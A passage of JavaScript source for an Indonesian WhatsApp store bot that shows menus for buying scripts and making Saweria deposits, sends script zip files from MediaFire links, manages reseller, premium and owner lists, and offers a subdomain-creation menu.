highlight_label: 'Powered By RiiSTORE ID',
rows: [{
title: 'BUY SC V1',
description: `Script Version 1.0.0`, 
id: '.buyscv1'
},
{
title: 'BUY SC V2',
description: `Script Version 2.0.0`, 
id: '.buyscv2'
},
{
title: 'BUY SC V3',
description: `Script Version 3.0.0`, 
id: '.buyscv3'
},
{
title: 'BUY SC V3 UPDATE',
description: `Script Version 3.0.3`, 
id: '.buyscv3-update'
},
{
title: 'BUY SC V3 SAWERIA',
description: `Script Version 3.0.3`, 
id: '.buyscv3-saweria'
}]
     }]
let listMessage = {
    title: 'List Script Menu', 
    sections
};

let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: `${footer2}`
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./lib/thumbnail/thumbnail.jpg")}, { upload: rafatharcode.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Owner\",\"url\":\"https://wa.me/6283161246809\",\"merchant_url\":\"https://wa.me/6283161246809\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await rafatharcode.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case 'deposaweriamenu':
case 'deposaweriamenu': {
let teksnya = `Berikut Deposit Saweria`
let sections = [{
title: '# LIST DEPOSIT SAWERIA',
highlight_label: 'Powered By RiiSTORE ID',
rows: [{
title: 'DEPOSIT 1000',
description: `Deposit Saweria 1000`, 
id: '.depo1000'
},
{
title: 'DEPOSIT 2000',
description: `Deposit Saweria 2000`, 
id: '.depo2000'
},
{
title: 'DEPOSIT 3000',
description: `Deposit Saweria 3000`, 
id: '.depo3000'
},
{
title: 'DEPOSIT 4000',
description: `Deposit Saweria 4000`, 
id: '.depo4000'
},
{
title: 'DEPOSIT 5000',
description: `Deposit Saweria 5000`, 
id: '.depo5000'
},
{
title: 'DEPOSIT 6000',
description: `Deposit Saweria 6000`, 
id: '.depo6000'
},
{
title: 'DEPOSIT 7000',
description: `Deposit Saweria 7000`, 
id: '.depo7000'
},
{
title: 'DEPOSIT 8000',
description: `Deposit Saweria 8000`, 
id: '.depo8000'
},
{
title: 'DEPOSIT 9000',
description: `Deposit Saweria 9000`, 
id: '.depo9000'
},
{
title: 'DEPOSIT 10000',
description: `Deposit Saweria 10000`, 
id: '.depo10000'
},
{
title: 'DEPOSIT 11000',
description: `Deposit Saweria 11000`, 
id: '.depo11000'
},
{
title: 'DEPOSIT 12000',
description: `Deposit Saweria 12000`, 
id: '.depo12000'
},
{
title: 'DEPOSIT 13000',
description: `Deposit Saweria 13000`, 
id: '.depo13000'
},
{
title: 'DEPOSIT 14000',
description: `Deposit Saweria 14000`, 
id: '.depo14000'
},
{
title: 'DEPOSIT 15000',
description: `Deposit Saweria 15000`, 
id: '.depo15000'
},
{
title: 'DEPOSIT 16000',
description: `Deposit Saweria 16000`, 
id: '.depo16000'
},
{
title: 'DEPOSIT 17000',
description: `Deposit Saweria 17000`, 
id: '.depo17000'
},
{
title: 'DEPOSIT 18000',
description: `Deposit Saweria 18000`, 
id: '.depo18000'
},
{
title: 'DEPOSIT 19000',
description: `Deposit Saweria 19000`, 
id: '.depo19000'
},
{
title: 'DEPOSIT 20000',
description: `Deposit Saweria 20000`, 
id: '.depo20000'
},
{
title: 'DEPOSIT 21000',
description: `Deposit Saweria 21000`, 
id: '.depo21000'
},
{
title: 'DEPOSIT 22000',
description: `Deposit Saweria 22000`, 
id: '.depo11000'
},
{
title: 'DEPOSIT 23000',
description: `Deposit Saweria 23000`, 
id: '.depo23000'
},
{
title: 'DEPOSIT 24000',
description: `Deposit Saweria 24000`, 
id: '.depo24000'
},
{
title: 'DEPOSIT 25000',
description: `Deposit Saweria 25000`, 
id: '.depo25000'
},
{
title: 'DEPOSIT 26000',
description: `Deposit Saweria 26000`, 
id: '.depo26000'
},
{
title: 'DEPOSIT 27000',
description: `Deposit Saweria 27000`, 
id: '.depo27000'
},
{
title: 'DEPOSIT 28000',
description: `Deposit Saweria 28000`, 
id: '.depo28000'
},
{
title: 'DEPOSIT 29000',
description: `Deposit Saweria 29000`, 
id: '.depo29000'
},
{
title: 'DEPOSIT 30000',
description: `Deposit Saweria 30000`, 
id: '.depo30000'
},
{
title: 'DEPOSIT 35000',
description: `Deposit Saweria 35000`, 
id: '.depo35000'
},
{
title: 'DEPOSIT 40000',
description: `Deposit Saweria 40000`, 
id: '.depo40000'
},
{
title: 'DEPOSIT 45000',
description: `Deposit Saweria 45000`, 
id: '.depo45000'
},
{
title: 'DEPOSIT 50000',
description: `Deposit Saweria 50000`, 
id: '.depo50000'
},
{
title: 'DEPOSIT 55000',
description: `Deposit Saweria 55000`, 
id: '.depo55000'
},
{
title: 'DEPOSIT 60000',
description: `Deposit Saweria 60000`, 
id: '.depo60000'
},
{
title: 'DEPOSIT 65000',
description: `Deposit Saweria 65000`, 
id: '.depo65000'
},
{
title: 'DEPOSIT 70000',
description: `Deposit Saweria 70000`, 
id: '.depo70000'
},
{
title: 'DEPOSIT 75000',
description: `Deposit Saweria 75000`, 
id: '.depo75000'
},
{
title: 'DEPOSIT 80000',
description: `Deposit Saweria 80000`, 
id: '.depo80000'
},
{
title: 'DEPOSIT 85000',
description: `Deposit Saweria 85000`, 
id: '.depo85000'
},
{
title: 'DEPOSIT 90000',
description: `Deposit Saweria 90000`, 
id: '.depo90000'
},
{
title: 'DEPOSIT 95000',
description: `Deposit Saweria 95000`, 
id: '.depo95000'
},
{
title: 'DEPOSIT 100000',
description: `Deposit Saweria 100000`, 
id: '.depo100000'
},
{
title: 'BATAL MEMBELI',
description: `Membatalkan Pembayaran`, 
id: '.batal-membeli'
}]
     }]
let listMessage = {
    title: 'List Deposit Saweria', 
    sections
};

let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: `${footer2}`
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./lib/thumbnail/thumbnail.jpg")}, { upload: rafatharcode.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Owner\",\"url\":\"https://wa.me/6283161246809\",\"merchant_url\":\"https://wa.me/6283161246809\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await rafatharcode.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case 'kirimscmenu':
case 'kirimscmenu': {
let teksnya = `Berikut List Script Menu`
let sections = [{
title: '# LIST SCRIPT MENU',
highlight_label: 'Powered By RiiSTORE ID',
rows: [{
title: 'KIRIM SC V1',
description: `Script Version 1.0.0`, 
id: '.kirimscv1'
},
{
title: 'KIRIM SC V2',
description: `Script Version 2.0.0`, 
id: '.kirimscv2'
},
{
title: 'KIRIM SC V3',
description: `Script Version 3.0.0`, 
id: '.kirimscv3'
},
{
title: 'KIRIM SC V3 UPDATE',
description: `Script Version 3.0.3`, 
id: '.kirimscv3-update'
}]
     }]
let listMessage = {
    title: 'List Script Menu', 
    sections
};

let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: `${footer2}`
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./lib/thumbnail/thumbnail.jpg")}, { upload: rafatharcode.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Owner\",\"url\":\"https://wa.me/6283161246809\",\"merchant_url\":\"https://wa.me/6283161246809\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await rafatharcode.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case 'buyscv1': {
if (!isOwner) return rafatharcodereply('Maaf!! Saldo Anda Kurang Dari 25.000 ( 25K ), Buy Sc Nya Bisa Langsung Hubungi Owner Kami.')
rafatharcodereply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/t931ywa624mpqwl/rafanoencv1.zip/file')
rafatharcode.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m}).catch ((err) => reply('*Failed to download File*'))
}
break

case 'buyscv2': {
if (!isOwner) return rafatharcodereply('Maaf!! Saldo Anda Kurang Dari 35.000 ( 35K ), Buy Sc Nya Bisa Langsung Hubungi Owner Kami.')
rafatharcodereply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/713wnuucsbt5yio/rafanoencv2.zip/file')
rafatharcode.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m}).catch ((err) => reply('*Failed to download File*'))
}
break

case 'buyscv3': {
if (!isOwner) return rafatharcodereply('Maaf!! Saldo Anda Kurang Dari 45.000 ( 45K ), Buy Sc Nya Bisa Langsung Hubungi Owner Kami.')
rafatharcodereply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/9sruspx4a843wuv/rafanoencv3.zip/file')
rafatharcode.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m}).catch ((err) => reply('*Failed to download File*'))
}
break

case 'buyscv3-update': {
if (!isOwner) return rafatharcodereply('Maaf!! Saldo Anda Kurang Dari 55.000 ( 55K ), Buy Sc Nya Bisa Langsung Hubungi Owner Kami.')
rafatharcodereply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/1g0cdxreqvtl94k/BOT+CPANEL+RAFATHAR+CODE+PRIVATE+(3).zip/file')
rafatharcode.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m}).catch ((err) => reply('*Failed to download File*'))
}
break

case 'buyscv3-saweria': {
if (!isOwner) return rafatharcodereply('Maaf!! Saldo Anda Kurang Dari 55.000 ( 55K ), Buy Sc Nya Bisa Langsung Hubungi Owner Kami.')
rafatharcodereply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/lju5kbvlxdpq66l/BOT+CPANEL+SAWERIA+RAFATHAR+CODE+V3.0.3.zip/file')
rafatharcode.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m}).catch ((err) => reply('*Failed to download File*'))
}
break

case 'kirimscv1': {
if (!isOwner) return onlyOwn()
if (!args[0]) return rafatharcodereply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
rafatharcodereply(`*_Sukses Terkirim Tuan..._*`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/t931ywa624mpqwl/rafanoencv1.zip/file')
rafatharcode.sendMessage(piw, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m}).catch ((err) => reply('*Failed to download File*'))
}
break

case 'kirimscv2': {
if (!isOwner) return onlyOwn()
if (!args[0]) return rafatharcodereply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
rafatharcodereply(`*_Sukses Terkirim Tuan..._*`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/713wnuucsbt5yio/rafanoencv2.zip/file')
rafatharcode.sendMessage(piw, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m}).catch ((err) => reply('*Failed to download File*'))
}
break

case 'kirimscv3': {
if (!isOwner) return onlyOwn()
if (!args[0]) return rafatharcodereply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
rafatharcodereply(`*_Sukses Terkirim Tuan..._*`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/9sruspx4a843wuv/rafanoencv3.zip/file')
rafatharcode.sendMessage(piw, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m}).catch ((err) => reply('*Failed to download File*'))
}
break

case 'kirimscv3-update': {
if (!isOwner) return onlyOwn()
if (!args[0]) return rafatharcodereply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
rafatharcodereply(`*_Sukses Terkirim Tuan..._*`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/1g0cdxreqvtl94k/BOT+CPANEL+RAFATHAR+CODE+PRIVATE+(3).zip/file')
rafatharcode.sendMessage(piw, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m}).catch ((err) => reply('*Failed to download File*'))
}
break

case 'kirimscv3-saweria': {
if (!isOwner) return onlyOwn()
if (!args[0]) return rafatharcodereply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
rafatharcodereply(`*_Sukses Terkirim Tuan..._*`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/lju5kbvlxdpq66l/BOT+CPANEL+SAWERIA+RAFATHAR+CODE+V3.0.3.zip/file')
rafatharcode.sendMessage(piw, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m}).catch ((err) => reply('*Failed to download File*'))
}
break

case 'addreseller':
case 'addres': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} nomor`)
bnnd = text.split("|")[0].replace(/[^0-9]/g, '')
let cekseler = await rafatharcode.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (cekseler.length == 0) return m.reply(`Masukkan nomor yang aktif!`)
res.push(bnnd)
fs.writeFileSync('./data/reseller.json', JSON.stringify(res))
m.reply(`Berhasil addreseller`)
}
break

case 'addreseller2':
case 'addres': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} nomor`)
bnnd = text.split("|")[0].replace(/[^0-9]/g, '')
let cekseler = await rafatharcode.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (cekseler.length == 0) return m.reply(`Masukkan nomor yang aktif!`)
res3.push(bnnd)
fs.writeFileSync('./data/reseller3.json', JSON.stringify(res3))
m.reply(`Berhasil addreseller`)
}
break

case 'addresinstall':
case 'addresin': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} nomor`)
bnnd = text.split("|")[0].replace(/[^0-9]/g, '')
let cekseler = await rafatharcode.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (cekseler.length == 0) return m.reply(`Masukkan nomor yang aktif!`)
resinstall.push(bnnd)
fs.writeFileSync('./data/resinstall.json', JSON.stringify(resinstall))
rafatharcodereply(`Berhasil addresinstall`)
}
break

case 'adddomain': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} nomor`)
bnnd = text.split("|")[0].replace(/[^0-9]/g, '')
let cekdom = await rafatharcode.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (cekdom.length == 0) return m.reply(`Masukkan nomor yang aktif!`)
jangan.push(bnnd)
fs.writeFileSync('./data/jangan.json', JSON.stringify(jangan))
m.reply(`Selamat Sekarang Ada Bisa Mengakses Domain!`)
}
break

case 'delreseller':
case 'delres': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} nomor`)
yaki = text.split("|")[0].replace(/[^0-9]/g, '')
unp = res.indexOf(yaki)
res.splice(unp, 1)
fs.writeFileSync('./data/reseller.json', JSON.stringify(res))
m.reply(`Berhasil delreseller`)
}
break

case 'delreseller2':
case 'delres2': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} nomor`)
yaki = text.split("|")[0].replace(/[^0-9]/g, '')
unp = res3.indexOf(yaki)
res3.splice(unp, 1)
fs.writeFileSync('./data/reseller3.json', JSON.stringify(res3))
m.reply(`Berhasil delreseller`)
}
break

case 'deldomain': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} nomor`)
yaki = text.split("|")[0].replace(/[^0-9]/g, '')
unp = jangan.indexOf(yaki)
jangan.splice(unp, 1)
fs.writeFileSync('./data/jangan.json', JSON.stringify(jangan))
m.reply(`Sekarang Anda Tidak Bisa Mengakses Domain!`)
}
break

case 'delresinstall':
case 'delresin': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} nomor`)
yaki = text.split("|")[0].replace(/[^0-9]/g, '')
unp = resinstall.indexOf(yaki)
resinstall.splice(unp, 1)
fs.writeFileSync('./data/resinstall.json', JSON.stringify(resinstall))
rafatharcodereply(`Berhasil delresinstall`)
}
break

case 'listresinstall':
case 'listresin': {
if (!isOwner) return onlyOwn()
tekso = `List resinstall\nTotal: ${resinstall.length}\n\n`
for (let i of resinstall) {
tekso += `• ${i}\n`
}
rafatharcodereply(tekso.trim())
}
break

case 'listreseller':
case 'listres': {
if (!isOwner) return onlyOwn()
tekso = `List reseller\nTotal: ${res.length}\n\n`
for (let i of res) {
tekso += `• ${i}\n`
}
m.reply(tekso.trim())
}
break

case 'listreseller2':
case 'listres2': {
if (!isOwner) return onlyOwn()
tekso = `List reseller\nTotal: ${res3.length}\n\n`
for (let i of res3) {
tekso += `• ${i}\n`
}
m.reply(tekso.trim())
}
break

case 'listpdomain': {
if (!isOwner) return onlyOwn()
tekso = `List Pengguna Domain\nTotal: ${jangan.length}\n\n`
for (let i of jangan) {
tekso += `• ${i}\n`
}
m.reply(tekso.trim())
}
break

case 'addprem': {
if (!isOwner) return onlyOwn()
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return m.reply(`Contoh: ${prefix+command} @tag|30d`)
if (!atnm) return m.reply(`Mau berapa hari?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
m.reply('Berhasil addprem')
} else {
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
m.reply('Berhasil addprem')
}}
break

case 'delprem': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} 628xx`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
premium.splice(prem.getPremiumPosition(users, premium), 1)
fs.writeFileSync('./data/premium.json', JSON.stringify(premium))
m.reply('Berhasil delprem')
} else {
premium.splice(prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./data/premium.json', JSON.stringify(premium))
m.reply('Berhasil delprem')
}}
break

case 'listpremium': 
case 'listprem': {
if (!isOwner) return onlyOwn()
let txt = `List premium\nTotal: ${premium.length}\n\n`;
let men = [];
for (let i of premium) {
men.push(i.id);
let idPart = i.id?.split("@")[0] ?? 'Undefined';
txt += `ID: @${idPart}\n`;
if (i.expired === 'Permanen') {
let cekvip = 'Permanen';
txt += `Expired: Permanen\n\n`;
} else {
let cekvip = ms(i.expired - Date.now());
txt += `Expired: ${cekvip.days} hari, ${cekvip.hours} jam, ${cekvip.minutes} menit, ${cekvip.seconds} detik\n\n`;
}
}
rafatharcode.sendTeks(m.chat, txt, m);
}
break

case 'listpc': {
if (!isOwner) return onlyOwn()
let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `*Private Chat*\nTotal: ${anulistp.length} Chat\n\n`
for (let i of anulistp) {
let nama = store.messages[i].array[0].pushName
teks += `*Name :* ${pushname}\n*User :* @${m.sender.split('@')[0]}\n*Chat :* https://wa.me/${m.sender.split('@')[0]}\n\n───────────\n\n`
}
rafatharcodereply(teks)
}
break

case 'addowner': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} tag/kutip`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')
own.push(users)
fs.writeFileSync('./data/owner.json', JSON.stringify(own))
m.reply(`Berhasil addowner`)
}
break

case 'addowner2': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} tag/kutip`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')
asisten.push(users)
fs.writeFileSync('./data/owner2.json', JSON.stringify(asisten))
m.reply(`Berhasil addowner2`)
}
break

case 'delowner': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} tag/kutip`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.split("|")[0].replace(/[^0-9]/g, '')
own.splice(users, 1)
fs.writeFileSync('./data/owner.json', JSON.stringify(own))
m.reply(`Berhasil delowner`)
}
break

case 'delowner2': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} tag/kutip`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.split("|")[0].replace(/[^0-9]/g, '')
asisten.splice(users, 1)
fs.writeFileSync('./data/owner2.json', JSON.stringify(asisten))
m.reply(`Berhasil delowner2`)
}
break

case 'listowner': 
case 'listcreator': {
if (!isOwner) return onlyOwn()
teks = `List owner\nTotal: ${own.length}\n\n`
for (let kon of own) {
teks += `• ${kon}\n`
}
m.reply(teks)
}
break 

case 'listowner2': 
case 'listcreator': {
if (!isOwner) return onlyOwn()
teks = `List Assiten Owner Utama\nTotal: ${asisten.length}\n\n`
for (let kon of asisten) {
teks += `• ${kon}\n`
}
m.reply(teks)
}
break 

case 'subdomain': {
if (!isOwner) return onlyOwn()
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} hostname,ipVps`)
let hostname = t[0];
let ip = t[1];

let sections = [{
title: 'List Subdomain di bawah',
rows: [{
title: 'rafatharofficial.my.id',
description: `Create Subdomain rafatharofficial.my.id`, 
id: `.domain1 ${hostname}|${ip}`
},
{
title: 'digital-market.me', 
description: "Create Subdomin digital-market.me", 
id: `.domain2 ${hostname}|${ip}`
},
{
title: 'sellerpanell-store.xyz',
description: `Create Subdomain sellerpanell-store.xyz`, 
id: `.domain3 ${hostname}|${ip}`
},
{
title: 'mypanell-store.com',
description: `Create Subdomain mypanell-store.com`, 
id: `.domain4 ${hostname}|${ip}`
},
{
title: 'panelstoreku.xyz ',
description: `Create Subdomain panelstoreku.xyz `, 
id: `.domain5 ${hostname}|${ip}`
},
{
title: 'panelanimeku.my.id  ',
description: `Create Subdomain panelanimeku.my.id  `, 
id: `.domain7 ${hostname}|${ip}`
},
{
title: 'turzcloud.tech  ',
description: `Create Subdomain turzcloud.tech  `, 
id: `.domain8 ${hostname}|${ip}`
},
{
title: 'cloudxingyu.me  ',
description: `Create Subdomain cloudxingyu.me  `, 
id: `.domain9 ${hostname}|${ip}`
},
{
title: 'xinyustore.tech',
description: `Create Subdomain xinyustore.tech`, 
id: `.domain11 ${hostname}|${ip}`
},
{
title: 'panelshop.live',
description: `Create Subdomain panel-store.games`, 
id: `.domain12 ${hostname}|${ip}`
},
{
title: 'webhostt.my.id',
description: `Create Subdomain webhostt.my.id`, 
id: `.domain13 ${hostname}|${ip}`
},
{
title: 'fadhostmarketplace.me',
description: `Create Subdomain fadhostmarketplace.me`,
id: `.domain14 ${hostname}|${ip}`
},
{
title: 'fadhost.tech',
description: `Create Subdomain fadhost.tech`, 
id: `.domain15 ${hostname}|${ip}`
},
{
title: 'fadilhosting.my.id',
description: `Create Subdomain fadilhosting.my.id`, 
id: `.domain17 ${hostname}|${ip}`
},
{
title: 'kebutuhanhosting.biz.id',
description: `Create Subdomain kebutuhanhosting.biz.id`, 
id: `.domain18 ${hostname}|${ip}`
},
{
title: 'panelkuu.biz.id',
description: `Create Subdomain panelkuu.biz.id`, 
id: `.domain19 ${hostname}|${ip}`
},
{
title: 'riooxdzz.me',
description: `Create Subdomain riooxdzz.me`, 
id: `.domain20 ${hostname}|${ip}`
},
{
title: 'celiaofficial.my.id',
description: `Create Subdomain celiaofficial.my.id`, 
id: `.domain21 ${hostname}|${ip}`
},
{
title: 'celiastore.my.id',
description: `Create Subdomain celiastore.my.id`, 
id: `.domain22 ${hostname}|${ip}`
},
{
title: 'panellofficial.site',
description: `Create Subdomain panellofficial.site`, 
id: `.domain23 ${hostname}|${ip}`
},
{
title: 'panellofficial.my.id',
description: `Create Subdomain panellofficial.my.id`, 
id: `.domain24 ${hostname}|${ip}`
},
{
title: 'celiapanellstore.my.id',
description: `Create Subdomain celiapanellstore.my.id`, 
id: `.domain25 ${hostname}|${ip}`
},
{
title: 'rullz.me',
description: `Create Subdomain rullz.me`, 
id: `.domain26 ${hostname}|${ip}`
},
{
title: 'rullz.tech',
description: `Create Subdomain rullz.tech`, 
id: `.domain27 ${hostname}|${ip}`
},
{
title: 'rullzpedia.com',
description: `Create Subdomain rullzpedia.com`, 
id: `.domain28 ${hostname}|${ip}`
},
{
title: 'panell.icu',
description: `Create Subdomain panell.icu`, 
id: `.domain29 ${hostname}|${ip}`
},
{
title: 'panellstoree.com',
description: `Create Subdomain panellstoree.com`, 
id: `.domain30 ${hostname}|${ip}`
},
{
title: 'panelanimeku.my.id',
description: `Create Subdomain panelanimeku.my.id`, 
id: `.domain31 ${hostname}|${ip}`
},
{
title: 'rafatharcode.me',
description: `Create Subdomain rafatharcode.me`, 
id: `.domain32 ${hostname}|${ip}`
},
{
title: 'petrahosting.my.id',
description: `Create Subdomain petrahosting.my.id`, 
id: `.domain33 ${hostname}|${ip}`
},
{
title: 'moon-offc.my.id',
description: `Create Subdomain moon-offc.my.id`, 
id: `.domain34 ${hostname}|${ip}`
},
{
title: 'aryaelsa.tech',
description: `Create Subdomain aryaelsa.tech`, 
id: `.domain35 ${hostname}|${ip}`
},
{
title: 'zanss.xyz',
description: `Create Subdomain zanss.xyz`, 
id: `.domain36 ${hostname}|${ip}`
},
{
title: 'focal.us.kg',
description: `Create Subdomain focal.us.kg`, 
id: `.domain37 ${hostname}|${ip}`
},
{
title: 'lanamel.live',
description: `Create Subdomain lanamel.live`, 
id: `.domain38 ${hostname}|${ip}`
},
{
title: 'loydzstoree.my.id',
description: `Create Subdomain loydzstoree.my.id`, 
id: `.domain39 ${hostname}|${ip}`
},
{
title: 'panell-lan.my.id',
description: `Create Subdomain panell-lan.my.id`, 
id: `.domain40 ${hostname}|${ip}`
},
{
title: 'waysdev.my.id',
description: `Create Subdomain waysdev.my.id`, 
id: `.domain41 ${hostname}|${ip}`
}]
}]

let listMessage = {
    title: 'Klik Disini!', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By RiiSTORE ID', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: rafatharcode.decodeJid(rafatharcode.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Please choose the you subdomain`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${m.sender.split("@")[0]} 👋*`,
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b16b6163e621449bdcecb.jpg" } }, { upload: rafatharcode.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
